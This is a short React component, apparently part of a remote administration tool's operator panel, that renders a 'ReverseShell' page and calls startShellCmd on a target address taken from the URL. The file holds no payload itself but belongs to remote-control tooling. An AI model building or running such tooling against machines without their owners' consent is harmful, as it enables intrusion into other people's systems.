import { useParams } from "react-router-dom";
import { useEffect } from "react";
import { Ascii, Command, Header } from "../components/Shell";
import { startShellCmd } from "../rat/RATCommands";

export const ReverseShell = () => {
  const { addr } = useParams();

  useEffect(() => {
    startShellCmd(addr);
  }, []);

  return (
    <div className="reverse-shell bg-primarybg text-slate-300 w-full h-screen overflow-x-hidden">
      <Ascii />
      <Header />
      <Command addr={String(addr)} />
    </div>
  );
};
